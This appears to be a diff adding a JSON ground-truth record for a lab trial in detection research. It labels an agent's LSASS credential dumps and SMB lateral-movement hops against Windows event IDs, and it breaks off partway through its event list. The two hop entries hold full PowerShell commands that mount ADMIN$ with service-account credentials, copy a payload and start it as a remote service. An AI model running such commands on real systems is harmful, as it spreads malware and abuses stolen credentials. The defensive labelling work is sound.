@@ -1,0 +1,1068 @@
+{
+  "trial_id": "s07_t00",
+  "scenario": "s07",
+  "status": "draft",
+  "provenance": "log-based, agent process tree (decision 020)",
+  "db_sha256": "22246abaacd2418b1e3bd5633bbf69a338f34be2c2b6495a8c88de43c100c9d3",
+  "window": {
+    "source": "key",
+    "start_utc": "2026-10-12T09:16:06.233Z",
+    "end_utc": "2026-10-12T09:24:33.183Z",
+    "provisional": null,
+    "shrink_flag": null,
+    "outside_counts": {
+      "target_side_events": 6,
+      "per_hop": {
+        "s07-t1": 6
+      }
+    }
+  },
+  "agent": {
+    "image": "C:\\Users\\Public\\splunkd.exe",
+    "server_ip": "192.168.50.50",
+    "server_port": 8888,
+    "server_confirmed": true,
+    "sysmon3_event_uids": [
+      "a82e79c4f31aa8a0f4b64e54c5b8f3c85d1a5631e2d6fdfb6c78e4e7e0d71d01",
+      "7abfb57216fad526121fe35ed3333d90726e2dbfb9e6306876756e8b830b1389",
+      "99d22a45da0f7135ef85e10c51436b58705f7e6d47ebdd2f7a60dec9b2f5b858",
+      "9744ca66d21357a641c044debfc6e53cf11fda33b51fd789de35677b5f09c31e",
+      "3c8a59982de6c492daf580ea2b925add67e2633845b6d50ec07bed675455d9fb",
+      "404e81637d1dacd84d8251bf49f9cd99d86f3a21d7e7f1e8da974b7f23f0661f",
+      "669862110cb04514c892dcb4d7a59844902019cd13b51d513a1dae62982cd328",
+      "a097f905c8997dd0a2106586b3d12de4d2fdace17232823ce3cc7fd0cd1c5d15",
+      "3b9cdf6c3db737f7d4b5d17ba5b182ac623bb365a687e01b7442f1ade9d13513",
+      "09226ed7e1503dbf867944433f6b6f3ef8ce9c1c310c39f6b7ba425a7a94c2ac",
+      "f98e0c8500873d3e2f76fe2af4d51441a6a3588ea613e3112c7bb4f1b34c9026",
+      "cd30b87289c50fc1c2b172ca5c285bfd77c0eb663b03d3ceca774f2f385ff712"
+    ],
+    "accounts": [
+      "admin_it",
+      "svc_backup",
+      "svc_sql",
+      "system"
+    ],
+    "run_days": [
+      "2026-10-12"
+    ],
+    "run_day": "2026-10-12",
+    "run_interval": {
+      "start_utc": "2026-10-12T09:09:49.665Z",
+      "end_utc": "2026-10-12T09:21:58.477Z"
+    },
+    "manifest_span": {
+      "start_utc": "2026-09-24T04:54:18.744946Z",
+      "end_utc": "2026-10-12T09:21:58.477689Z",
+      "source": "data/manifest.csv",
+      "files": 7
+    },
+    "run_day_rule": "run = the latest splunkd root plus every earlier root reached by walking back while consecutive roots are <= 6 h apart (roots = Sysmon 1 children of the agent splunkd.exe in Users/Public plus pid_match_4688 roots); run days = UTC days from the earliest to the latest of those roots; run_interval start = earliest root of a walk-back with a 30 min gap (trials of one day share a DB) - 60 s, end = last step + 300 s; older roots belong to other runs"
+  },
+  "steps": [
+    {
+      "step_id": "s07-agent-ep-02-1",
+      "kind": "agent_start",
+      "host": "ep-02",
+      "time_utc": "2026-10-12T07:06:28.532000Z",
+      "account": "admin_it",
+      "status": "confirmed",
+      "source": "agent_tree",
+      "event_uids": [
+        "a765fe8d86bd60e989c3b7d0dcb1378d8ef7e82efca898e17ac5fc24d900182f",
+        "8b4a334a93862af93aad2b2b3593bacdcaf3866e1f993b638736d008a3064273"
+      ],
+      "note": "splunkd.exe launch (Sysmon 1; 4688 corroborates)"
+    },
+    {
+      "step_id": "s07-agent-ep-01-2",
+      "kind": "agent_start",
+      "host": "ep-01",
+      "time_utc": "2026-10-12T09:10:40.254000Z",
+      "account": "svc_sql",
+      "status": "confirmed",
+      "source": "agent_tree",
+      "event_uids": [
+        "c2b6170035f837c5938893232da8f85e7360cc9cad582db0f610a11efabf1964",
+        "a3db11e72fb0297b63454f9d33e5093214c13903a088e545ff7a6932f2080c74",
+        "d6f5d144ec2e8f1546eae8ee746fab7b12eee965a5071d69518f5a8c7397fec7",
+        "da788b98644edb6ab2836b9e3cb96dc7720a2b26ac7ae9e09c57aff1f114e1cc"
+      ],
+      "note": "splunkd.exe launch (Sysmon 1; 4688 corroborates)"
+    },
+    {
+      "step_id": "s07-agent-ep-01-3",
+      "kind": "agent_start",
+      "host": "ep-01",
+      "time_utc": "2026-10-12T09:10:40.260000Z",
+      "account": "svc_backup",
+      "status": "confirmed",
+      "source": "agent_tree",
+      "event_uids": [
+        "26ef12d19e4eff5e55ff8a4d7a708a0d8815c141160f6180637c933ec876a470",
+        "a3db11e72fb0297b63454f9d33e5093214c13903a088e545ff7a6932f2080c74",
+        "d6f5d144ec2e8f1546eae8ee746fab7b12eee965a5071d69518f5a8c7397fec7",
+        "da788b98644edb6ab2836b9e3cb96dc7720a2b26ac7ae9e09c57aff1f114e1cc"
+      ],
+      "note": "splunkd.exe launch (Sysmon 1; 4688 corroborates)"
+    },
+    {
+      "step_id": "s07-agent-ep-01-4",
+      "kind": "agent_start",
+      "host": "ep-01",
+      "time_utc": "2026-10-12T09:10:40.290000Z",
+      "account": "admin_it",
+      "status": "confirmed",
+      "source": "agent_tree",
+      "event_uids": [
+        "e8e58bf88010017870f12d54ed793860e82e076378e8fe665ae1fe549bc3a09a",
+        "a3db11e72fb0297b63454f9d33e5093214c13903a088e545ff7a6932f2080c74",
+        "d6f5d144ec2e8f1546eae8ee746fab7b12eee965a5071d69518f5a8c7397fec7",
+        "da788b98644edb6ab2836b9e3cb96dc7720a2b26ac7ae9e09c57aff1f114e1cc"
+      ],
+      "note": "splunkd.exe launch (Sysmon 1; 4688 corroborates)"
+    },
+    {
+      "step_id": "s07-dump-x",
+      "kind": "lsass_dump",
+      "host": "ep-01",
+      "time_utc": "2026-10-12T09:17:06.233000Z",
+      "account": "svc_backup",
+      "status": "confirmed",
+      "source": "agent_tree",
+      "event_uids": [
+        "3c3ff3230c2bc9b5cceaf03cda41588b57e9946dd7c960ea4d83afaf66cd999d",
+        "8824b80b39973ccb9b9e2a5d66db8c69ed00f3436a36675eb67aaa7b79c35140"
+      ],
+      "note": "rundll32 -> lsass in agent tree"
+    },
+    {
+      "step_id": "s07-dump-y",
+      "kind": "lsass_dump",
+      "host": "ep-01",
+      "time_utc": "2026-10-12T09:18:36.227000Z",
+      "account": "svc_backup",
+      "status": "confirmed",
+      "source": "agent_tree",
+      "event_uids": [
+        "133f095b51ec14ba51025a7d4815d199968f27bc59c141018d06f4ee2f88bc24",
+        "3eab684be59243d61314d78ee34afacdbe727248df3d5e3bb26f1abb63e881a6"
+      ],
+      "note": "rundll32 -> lsass in agent tree"
+    },
+    {
+      "step_id": "s07-h-x-move",
+      "kind": "move",
+      "host": "ep-01",
+      "time_utc": "2026-10-12T09:17:54.024000Z",
+      "account": "svc_backup",
+      "status": "confirmed",
+      "source": "agent_tree",
+      "event_uids": [
+        "5fbcdb4d9097752a82a8b5b69c9388da7203bfc12288aa42e8e3e4fc33ef4cc0",
+        "21cc225b8ca3d1f7ba02bfaff1d868d6bc07e85cacef599e1fdc6e280ff17db2",
+        "5634d6f544f32d734c219f66425284dd9af3c7116021e06e1326a166e9866f50",
+        "d7443dcf157ce78d4decb59d2e7e861ad5dd5efd8fc31103a549c6735ec45b0d"
+      ],
+      "note": "command naming ep-02"
+    },
+    {
+      "step_id": "s07-h-x-svc",
+      "kind": "service_exec",
+      "host": "ep-02",
+      "time_utc": "2026-10-12T09:17:58.083898Z",
+      "account": null,
+      "status": "confirmed",
+      "source": "target_side",
+      "event_uids": [
+        "2e795a85c686f0d52f32cf217bc3d77845efe0d353788f73f6f5be1bc250ce46",
+        "b14873e8ac54c288fe149af42c97a8a581b734f98ad9f194182d7ae861c6f529"
+      ],
+      "note": "service install evidence on the target"
+    },
+    {
+      "step_id": "s07-h-y-move",
+      "kind": "move",
+      "host": "ep-01",
+      "time_utc": "2026-10-12T09:19:30.841000Z",
+      "account": "svc_backup",
+      "status": "confirmed",
+      "source": "agent_tree",
+      "event_uids": [
+        "537c2df82be2d4c1cb5a665d6be823b9fcf58304f30f3aa51ef4d39f18a04c23",
+        "2cd5080d4b971931ca43902f14f686a6e422f8b3a2501a9172623dcc87bb24f5",
+        "421fe0fb2a661ba5560b0a519ebfd47c23e3cebfdf73d00685a84193030bd5a0",
+        "4d2f7a8dd43efef58e7fcb0d301225f8ca2000405842407a0ce80f3e58603c19"
+      ],
+      "note": "command naming ep-02"
+    },
+    {
+      "step_id": "s07-h-y-svc",
+      "kind": "service_exec",
+      "host": "ep-02",
+      "time_utc": "2026-10-12T09:19:33.183268Z",
+      "account": null,
+      "status": "confirmed",
+      "source": "target_side",
+      "event_uids": [
+        "cee44f90297214bedbc83dc1cd9d91f70997aceb3079b338972745fbc641319f",
+        "108ce294ff69e98f83343b8b21df0bc13006c6dc30874e71b596e78566abd8bf"
+      ],
+      "note": "service install evidence on the target"
+    }
+  ],
+  "hops": [
+    {
+      "protocol": "SMB",
+      "source_host": "ep-01",
+      "command_host": "ep-01",
+      "target_host": "ep-02",
+      "basis": "command_names_target",
+      "source_session_logon_id": null,
+      "agent_account": "svc_backup",
+      "cmd_credential_account": "svc_backup",
+      "agent_command": "powershell.exe -ExecutionPolicy Bypass -C \"$pw = [Environment]::GetEnvironmentVariable('SVC_BACKUP_PW','Machine'); net use \\\\192.168.50.22\\IPC$ /user:LAB\\svc_backup *** Copy-Item C:\\Users\\Public\\Xpay.exe \\\\192.168.50.22\\ADMIN$\\Xpay.exe -Force; sc.exe \\\\192.168.50.22 create XferService binPath= \\\"C:\\Windows\\Xpay.exe\\\" start= demand; sc.exe \\\\192.168.50.22 start XferService\"",
+      "agent_command_time_utc": "2026-10-12T09:17:54.024000Z",
+      "agent_root_link": "sysmon_parent_image",
+      "agent_event_uids": [
+        "5fbcdb4d9097752a82a8b5b69c9388da7203bfc12288aa42e8e3e4fc33ef4cc0",
+        "21cc225b8ca3d1f7ba02bfaff1d868d6bc07e85cacef599e1fdc6e280ff17db2",
+        "5634d6f544f32d734c219f66425284dd9af3c7116021e06e1326a166e9866f50",
+        "d7443dcf157ce78d4decb59d2e7e861ad5dd5efd8fc31103a549c6735ec45b0d"
+      ],
+      "agent_corroboration_4688_uids": [
+        "0ae56fab62aa2ffac6cec140f44ffeb1a4b740a5d266291e0996bfb5a5c43c00",
+        "3903baa2991d0662d6e353e58dd43685a44ddb423a9b034667e6a9de29068167",
+        "4907e1f8a604798fc84d3f2ea0c342ebb09fae37a3d1bb98bd2383f443a5ddfc",
+        "d895032737335ae3700f84c3b5f087f05daa440f9b4739a6f8744730f764bc0c"
+      ],
+      "candidate_count": 1,
+      "candidate_count_before_absorption": 1,
+      "flags": [],
+      "needs_owner_approval": false,
+      "candidates": [
+        {
+          "account": "svc_backup",
+          "first_logon_time_utc": "2026-10-12T09:17:57.753472Z",
+          "logon_ids": [
+            "0x49cdfa",
+            "0x49cedc",
+            "0x49cf3d"
+          ],
+          "logon_uids": [
+            "72a62ab20a8c20dfe39ebf9c3dd6a3e3b262f83551bb8d8ed1eeb0066896e765",
+            "8351c7f300da9b8feefe2d73bacd73ff1f1c5f91213f3e7390fbc61588e33e72",
+            "ee86c364dd317ca6fcfa7ba8bdebccc77a65f914cd57b3d3abcc4ae40362488e"
+          ],
+          "authentication_package": "NTLM",
+          "source_ip": "192.168.50.21",
+          "name_match_by_logon_id": true
+        }
+      ],
+      "credential_logon_uids": [],
+      "related_logon_uids": [],
+      "port_join_event_uids": [],
+      "target_binding": "logon_id_artifact",
+      "reason": null,
+      "handoff_step": "s07-h-x",
+      "handoff_account": "svc_backup",
+      "role": "attack",
+      "path_role": "attack_pair",
+      "stray": false,
+      "method": "command_names_target+artifact",
+      "source_ip": "192.168.50.21",
+      "account": "svc_backup",
+      "logon_account": "svc_backup",
+      "move_time_utc": "2026-10-12T09:17:57.753472Z",
+      "target_logon_id": "0x49cdfa",
+      "authentication_package": "NTLM",
+      "target_4624_content_sha256": "060f2d1cd99c408cf3959111621db2d1479cdf5957095981fac05b7841558a75",
+      "target_event_uids": [
+        "72a62ab20a8c20dfe39ebf9c3dd6a3e3b262f83551bb8d8ed1eeb0066896e765",
+        "8351c7f300da9b8feefe2d73bacd73ff1f1c5f91213f3e7390fbc61588e33e72",
+        "ee86c364dd317ca6fcfa7ba8bdebccc77a65f914cd57b3d3abcc4ae40362488e",
+        "4ccf5f3c6d0cde2c23b0b9e918b44afff11c6ac68d47c18974c6a7100805ff03",
+        "fcdd4d6a2ad462c9affc83389955054fae29434864d3455cea617c9c0b24fe22",
+        "f395acd0d86b99ff549a67886d3ccf0b21ec4f78c24fab241669974e02dcf988",
+        "449a8543931076a7d7c246693d47fb68daf78f3ed079aa24d9ea686681f96aa9",
+        "1bb6de4fbb6684a15c134dfdb766059704cb228c7d66dec394b965da06e8c702",
+        "bd91e94d7b36998a4251d906a946b41e6dee8a8f4380f2af3a224841ddcad8a4",
+        "69e92dfbc001e1900d8415b46d589c78292bb489d6e38df3a2c5ff055b251010",
+        "52f0246c6ff33816efa4992b9c5684eb8468389ad7177501075ef4ad36ed5c9a",
+        "8177dd10788b86407f46a7da283fc81097dea5a73b3a120536edff007df472a7",
+        "ecaa652a6ee942f157728bc45bb3f1c04c400977c6b5b14b318ca0f023166bb8",
+        "1b9b0a9e4b9397a9a000f804f187f6ad9d015e4163aacc318ff5c788ab835c19",
+        "6f7f81dfe0d997a394c48f1e17324dc97c97dba1bf7e65ffd6d5170f727d41e2",
+        "a86ea93dbf47a74eb4bacaccf46143cf9c69dff09ebcf4c86b713578eef71573",
+        "792a368261207cf9ec5eea670007666830988680159c3dee2884d51e8cc6be07",
+        "9be7637247fb27f5bae6a6c4e6a6182c1daadfb2cd67d3a7c84f098c9839a492",
+        "2e795a85c686f0d52f32cf217bc3d77845efe0d353788f73f6f5be1bc250ce46",
+        "b14873e8ac54c288fe149af42c97a8a581b734f98ad9f194182d7ae861c6f529"
+      ],
+      "service_candidates_by_name": 1,
+      "time_delta_ms": 3729,
+      "select_how": "artifact",
+      "source_host_by_ip": "ep-01",
+      "identity_expected": 1,
+      "identity_basis": {
+        "dump_event_uid": "3c3ff3230c2bc9b5cceaf03cda41588b57e9946dd7c960ea4d83afaf66cd999d",
+        "dump_event_uids": [
+          "3c3ff3230c2bc9b5cceaf03cda41588b57e9946dd7c960ea4d83afaf66cd999d",
+          "8824b80b39973ccb9b9e2a5d66db8c69ed00f3436a36675eb67aaa7b79c35140"
+        ],
+        "dump_time_utc": "2026-10-12T09:17:06.233000Z",
+        "dump_host": "ep-01",
+        "open_session_ids": [
+          "0x161a2"
+        ],
+        "open_sessions": [
+          {
+            "logon_id": 90530,
+            "logon_id_hex": "0x161a2",
+            "logon_type": 4,
+            "exposure_strength": "strong",
+            "logon_time_utc": "2026-10-12T09:10:39.911334Z",
+            "event_uid": "a1b67934908137b84807545a7ba1ff2ffc4fb4d0fefd151a901d697435765e47"
+          }
+        ],
+        "end_unknown_ids": [],
+        "move_after_dump": true,
+        "tolerance_s": 5.0,
+        "dump_candidates_on_host": 2,
+        "identity_at_tol0": 1,
+        "identity_if_unknown_counted": 1,
+        "dump_account": "svc_backup",
+        "end_unknown": [],
+        "dump_before_agent_command_source_clock": true
+      },
+      "port_join_sysmon3": false,
+      "confidence_tier": "B",
+      "account_mismatch": false,
+      "status": "confirmed",
+      "hop_id": "s07-h-x",
+      "reviewed": false,
+      "excluded": false,
+      "excluded_reason": null,
+      "reviewed_note": null
+    },
+    {
+      "protocol": "SMB",
+      "source_host": "ep-01",
+      "command_host": "ep-01",
+      "target_host": "ep-02",
+      "basis": "command_names_target",
+      "source_session_logon_id": null,
+      "agent_account": "svc_backup",
+      "cmd_credential_account": "svc_sql",
+      "agent_command": "powershell.exe -ExecutionPolicy Bypass -C \"$pw = [Environment]::GetEnvironmentVariable('SVC_SQL_PW','Machine'); net use \\\\192.168.50.22\\IPC$ /user:LAB\\svc_sql *** Copy-Item C:\\Users\\Public\\Ypay.exe \\\\192.168.50.22\\ADMIN$\\Ypay.exe -Force; sc.exe \\\\192.168.50.22 create SyncService binPath= \\\"C:\\Windows\\Ypay.exe\\\" start= demand; sc.exe \\\\192.168.50.22 start SyncService\"",
+      "agent_command_time_utc": "2026-10-12T09:19:30.841000Z",
+      "agent_root_link": "sysmon_parent_image",
+      "agent_event_uids": [
+        "537c2df82be2d4c1cb5a665d6be823b9fcf58304f30f3aa51ef4d39f18a04c23",
+        "2cd5080d4b971931ca43902f14f686a6e422f8b3a2501a9172623dcc87bb24f5",
+        "421fe0fb2a661ba5560b0a519ebfd47c23e3cebfdf73d00685a84193030bd5a0",
+        "4d2f7a8dd43efef58e7fcb0d301225f8ca2000405842407a0ce80f3e58603c19"
+      ],
+      "agent_corroboration_4688_uids": [
+        "46a39b5d37e8cc88f8c23f13c916010de1560d817fe22d156b846e985c4a315d",
+        "4fcf4ea63306ac26b2bb4f82b72f536b30ff77c0a117d8cdac7f1ad2751357c0",
+        "a10ebdbbb0ec42222a1d04c872f0f8ebdc2643fe089217b51e61fdcfe7302888",
+        "f6b7371deb45bc8e0c9e246c75b1d715e4aadd73c7a840eef90d8d7e8293ef1e"
+      ],
+      "candidate_count": 1,
+      "candidate_count_before_absorption": 1,
+      "flags": [
+        "account_mismatch",
+        "handoff_mismatch"
+      ],
+      "needs_owner_approval": false,
+      "candidates": [
+        {
+          "account": "svc_backup",
+          "first_logon_time_utc": "2026-10-12T09:19:33.179614Z",
+          "logon_ids": [
+            "0x4b5d51",
+            "0x4b5da5"
+          ],
+          "logon_uids": [
+            "6f60f8e334fdc3a9310f6e6a61bcda17401c00831423bedd467114170e0d54bd",
+            "cc3d5b77a98438b68c90fbf2d07cdbf94c8f18191def049e2235e4ae32fefc66"
+          ],
+          "authentication_package": "NTLM",
+          "source_ip": "192.168.50.21",
+          "name_match_by_logon_id": true
+        }
+      ],
+      "credential_logon_uids": [],
+      "related_logon_uids": [],
+      "port_join_event_uids": [],
+      "target_binding": "logon_id_artifact",
+      "reason": null,
+      "handoff_step": "s07-h-y",
+      "handoff_account": "svc_sql",
+      "role": "attack",
+      "path_role": "attack_pair",
+      "stray": false,
+      "method": "command_names_target+artifact",
+      "source_ip": "192.168.50.21",
+      "account": "svc_backup",
+      "logon_account": "svc_backup",
+      "move_time_utc": "2026-10-12T09:19:33.179614Z",
+      "target_logon_id": "0x4b5d51",
+      "authentication_package": "NTLM",
+      "target_4624_content_sha256": "c41c04178682c55aa870a94965b760f298dbaeb8d0134f33d72e2cc1d2d13138",
+      "target_event_uids": [
+        "6f60f8e334fdc3a9310f6e6a61bcda17401c00831423bedd467114170e0d54bd",
+        "cc3d5b77a98438b68c90fbf2d07cdbf94c8f18191def049e2235e4ae32fefc66",
+        "cee44f90297214bedbc83dc1cd9d91f70997aceb3079b338972745fbc641319f",
+        "108ce294ff69e98f83343b8b21df0bc13006c6dc30874e71b596e78566abd8bf"
+      ],
+      "service_candidates_by_name": 1,
+      "time_delta_ms": 2339,
+      "select_how": "artifact",
+      "source_host_by_ip": "ep-01",
+      "identity_expected": 1,
+      "identity_basis": {
+        "dump_event_uid": "133f095b51ec14ba51025a7d4815d199968f27bc59c141018d06f4ee2f88bc24",
+        "dump_event_uids": [
+          "133f095b51ec14ba51025a7d4815d199968f27bc59c141018d06f4ee2f88bc24",
+          "3eab684be59243d61314d78ee34afacdbe727248df3d5e3bb26f1abb63e881a6"
+        ],
+        "dump_time_utc": "2026-10-12T09:18:36.227000Z",
+        "dump_host": "ep-01",
+        "open_session_ids": [
+          "0x161a2"
+        ],
+        "open_sessions": [
+          {
+            "logon_id": 90530,
+            "logon_id_hex": "0x161a2",
+            "logon_type": 4,
+            "exposure_strength": "strong",
+            "logon_time_utc": "2026-10-12T09:10:39.911334Z",
+            "event_uid": "a1b67934908137b84807545a7ba1ff2ffc4fb4d0fefd151a901d697435765e47"
+          }
+        ],
+        "end_unknown_ids": [],
+        "move_after_dump": true,
+        "tolerance_s": 5.0,
+        "dump_candidates_on_host": 2,
+        "identity_at_tol0": 1,
+        "identity_if_unknown_counted": 1,
+        "dump_account": "svc_backup",
+        "end_unknown": [],
+        "dump_before_agent_command_source_clock": true
+      },
+      "port_join_sysmon3": false,
+      "confidence_tier": "B",
+      "account_mismatch": true,
+      "status": "confirmed",
+      "hop_id": "s07-h-y",
+      "reviewed": false,
+      "excluded": false,
+      "excluded_reason": null,
+      "reviewed_note": null
+    },
+    {
+      "hop_id": "s07-t1",
+      "protocol": "SMB",
+      "source_host": "ep-01",
+      "target_host": "ep-02",
+      "source_ip": "192.168.50.21",
+      "command_host": null,
+      "method": "time_account_only+unexplained_logon",
+      "account": "admin_it",
+      "logon_account": "admin_it",
+      "agent_account": null,
+      "cmd_credential_account": null,
+      "handoff_account": null,
+      "handoff_step": null,
+      "account_mismatch": false,
+      "move_time_utc": "2026-10-12T09:11:08.098862Z",
+      "basis": "time_account_only",
+      "status": "unconfirmed",
+      "reason": "no_agent_command_names_target; logon lies inside the trial run interval 2026-10-12T09:09:49.665Z .. 2026-10-12T09:21:58.477Z",
+      "agent_event_uids": [],
+      "target_event_uids": [
+        "017fec3654e50ed911432733a9e8f211487423cc564bba768a9778af83409181",
+        "b9f82b991aeeb9267e48a10c5d0aa699ac25aa725a4e860a3d5ddcbf45fefe5e",
+        "1dc356d08ec3f69f4298586eb4e150264ad6fa45d8ba5fc52c14d85f108bd775",
+        "71bad54bf8b83402d247001dddc1e14b3b5337d5a5a16e85818360bcb8765913",
+        "8335779b7f841bfac8b4079798ca4ee4ba6794baaee3e0f6eb629cdf27b7e267",
+        "2a413f769b0b926c049e7a4b88c384676845e2b567df391b40fb525cdc385e4f"
+      ],
+      "identity_expected": 0,
+      "identity_basis": {
+        "dump_event_uid": null,
+        "dump_event_uids": [],
+        "dump_time_utc": null,
+        "dump_host": "ep-01",
+        "open_session_ids": [],
+        "open_sessions": [],
+        "end_unknown_ids": [],
+        "move_after_dump": false,
+        "tolerance_s": 5.0,
+        "dump_candidates_on_host": 2,
+        "identity_at_tol0": 0,
+        "identity_if_unknown_counted": 0
+      },
+      "time_delta_ms": null,
+      "confidence_tier": "D",
+      "target_binding": "time_account",
+      "candidate_count": 1,
+      "target_4624_content_sha256": "14e9bc4f95971a99aa5d11b35ae812e5cba9611709eba60d2e546af69cc479dc",
+      "credential_logon_uids": [],
+      "related_logon_uids": [],
+      "port_join_event_uids": [],
+      "needs_owner_approval": false,
+      "flags": [],
+      "role": "background",
+      "path_role": null,
+      "target_logon_id": "0x264f4c",
+      "authentication_package": "NTLM",
+      "source_host_by_ip": "ep-01",
+      "reviewed": true,
+      "excluded": false,
+      "excluded_reason": null,
+      "reviewed_note": "owner reviewed the six-hop rows 2026-11-10; background hop",
+      "shared_with_trials": []
+    }
+  ],
+  "paths": [
+    {
+      "path_id": "s07-h-x-path",
+      "role": "attack_pair",
+      "hop_ids": [
+        "s07-h-x"
+      ],
+      "status": "confirmed"
+    },
+    {
+      "path_id": "s07-h-y-path",
+      "role": "attack_pair",
+      "hop_ids": [
+        "s07-h-y"
+      ],
+      "status": "confirmed"
+    }
+  ],
+  "benign_paths": [],
+  "unconfirmed": [
+    {
+      "kind": "hop",
+      "id": "s07-t1",
+      "role": "background",
+      "reason": "no_agent_command_names_target; logon lies inside the trial run interval 2026-10-12T09:09:49.665Z .. 2026-10-12T09:21:58.477Z",
+      "flags": [],
+      "event_uids": [
+        "017fec3654e50ed911432733a9e8f211487423cc564bba768a9778af83409181",
+        "b9f82b991aeeb9267e48a10c5d0aa699ac25aa725a4e860a3d5ddcbf45fefe5e",
+        "1dc356d08ec3f69f4298586eb4e150264ad6fa45d8ba5fc52c14d85f108bd775",
+        "71bad54bf8b83402d247001dddc1e14b3b5337d5a5a16e85818360bcb8765913",
+        "8335779b7f841bfac8b4079798ca4ee4ba6794baaee3e0f6eb629cdf27b7e267",
+        "2a413f769b0b926c049e7a4b88c384676845e2b567df391b40fb525cdc385e4f"
+      ]
+    }
+  ],
+  "system_dumps_ignored": [],
+  "flags": [],
+  "open_points": [],
+  "event_keys": {
+    "017fec3654e50ed911432733a9e8f211487423cc564bba768a9778af83409181": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 4624,
+      "record_id": 1711892,
+      "time_utc": "2026-10-12T09:11:08.098862Z"
+    },
+    "09226ed7e1503dbf867944433f6b6f3ef8ce9c1c310c39f6b7ba425a7a94c2ac": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 3,
+      "record_id": 63805,
+      "time_utc": "2026-10-12T09:14:49.771000Z"
+    },
+    "0ae56fab62aa2ffac6cec140f44ffeb1a4b740a5d266291e0996bfb5a5c43c00": {
+      "host": "ep-01",
+      "channel": "Security",
+      "event_id": 4688,
+      "record_id": 2345567,
+      "time_utc": "2026-10-12T09:17:54.211215Z"
+    },
+    "108ce294ff69e98f83343b8b21df0bc13006c6dc30874e71b596e78566abd8bf": {
+      "host": "ep-02",
+      "channel": "System",
+      "event_id": 7045,
+      "record_id": 6085,
+      "time_utc": "2026-10-12T09:19:33.181067Z"
+    },
+    "133f095b51ec14ba51025a7d4815d199968f27bc59c141018d06f4ee2f88bc24": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 10,
+      "record_id": 64025,
+      "time_utc": "2026-10-12T09:18:36.227000Z"
+    },
+    "1b9b0a9e4b9397a9a000f804f187f6ad9d015e4163aacc318ff5c788ab835c19": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1733130,
+      "time_utc": "2026-10-12T09:19:33.039701Z"
+    },
+    "1bb6de4fbb6684a15c134dfdb766059704cb228c7d66dec394b965da06e8c702": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1732834,
+      "time_utc": "2026-10-12T09:17:57.943131Z"
+    },
+    "1dc356d08ec3f69f4298586eb4e150264ad6fa45d8ba5fc52c14d85f108bd775": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5140,
+      "record_id": 1711895,
+      "time_utc": "2026-10-12T09:11:08.105955Z"
+    },
+    "21cc225b8ca3d1f7ba02bfaff1d868d6bc07e85cacef599e1fdc6e280ff17db2": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 1,
+      "record_id": 63980,
+      "time_utc": "2026-10-12T09:17:54.210000Z"
+    },
+    "26ef12d19e4eff5e55ff8a4d7a708a0d8815c141160f6180637c933ec876a470": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 1,
+      "record_id": 63259,
+      "time_utc": "2026-10-12T09:10:40.260000Z"
+    },
+    "2a413f769b0b926c049e7a4b88c384676845e2b567df391b40fb525cdc385e4f": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1711898,
+      "time_utc": "2026-10-12T09:11:08.132016Z"
+    },
+    "2cd5080d4b971931ca43902f14f686a6e422f8b3a2501a9172623dcc87bb24f5": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 1,
+      "record_id": 64083,
+      "time_utc": "2026-10-12T09:19:31.065000Z"
+    },
+    "2e795a85c686f0d52f32cf217bc3d77845efe0d353788f73f6f5be1bc250ce46": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 4697,
+      "record_id": 1732844,
+      "time_utc": "2026-10-12T09:17:58.083898Z"
+    },
+    "3903baa2991d0662d6e353e58dd43685a44ddb423a9b034667e6a9de29068167": {
+      "host": "ep-01",
+      "channel": "Security",
+      "event_id": 4688,
+      "record_id": 2345585,
+      "time_utc": "2026-10-12T09:17:54.643279Z"
+    },
+    "3b9cdf6c3db737f7d4b5d17ba5b182ac623bb365a687e01b7442f1ade9d13513": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 3,
+      "record_id": 63344,
+      "time_utc": "2026-10-12T09:10:48.657000Z"
+    },
+    "3c3ff3230c2bc9b5cceaf03cda41588b57e9946dd7c960ea4d83afaf66cd999d": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 10,
+      "record_id": 63945,
+      "time_utc": "2026-10-12T09:17:06.233000Z"
+    },
+    "3c8a59982de6c492daf580ea2b925add67e2633845b6d50ec07bed675455d9fb": {
+      "host": "ep-02",
+      "channel": "Sysmon",
+      "event_id": 3,
+      "record_id": 49769,
+      "time_utc": "2026-10-12T07:12:36.282000Z"
+    },
+    "3eab684be59243d61314d78ee34afacdbe727248df3d5e3bb26f1abb63e881a6": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 10,
+      "record_id": 64027,
+      "time_utc": "2026-10-12T09:18:36.231000Z"
+    },
+    "404e81637d1dacd84d8251bf49f9cd99d86f3a21d7e7f1e8da974b7f23f0661f": {
+      "host": "ep-02",
+      "channel": "Sysmon",
+      "event_id": 3,
+      "record_id": 49788,
+      "time_utc": "2026-10-12T07:12:46.731000Z"
+    },
+    "421fe0fb2a661ba5560b0a519ebfd47c23e3cebfdf73d00685a84193030bd5a0": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 1,
+      "record_id": 64084,
+      "time_utc": "2026-10-12T09:19:33.472000Z"
+    },
+    "449a8543931076a7d7c246693d47fb68daf78f3ed079aa24d9ea686681f96aa9": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1732833,
+      "time_utc": "2026-10-12T09:17:57.939674Z"
+    },
+    "46a39b5d37e8cc88f8c23f13c916010de1560d817fe22d156b846e985c4a315d": {
+      "host": "ep-01",
+      "channel": "Security",
+      "event_id": 4688,
+      "record_id": 2346913,
+      "time_utc": "2026-10-12T09:19:31.065660Z"
+    },
+    "4907e1f8a604798fc84d3f2ea0c342ebb09fae37a3d1bb98bd2383f443a5ddfc": {
+      "host": "ep-01",
+      "channel": "Security",
+      "event_id": 4688,
+      "record_id": 2345581,
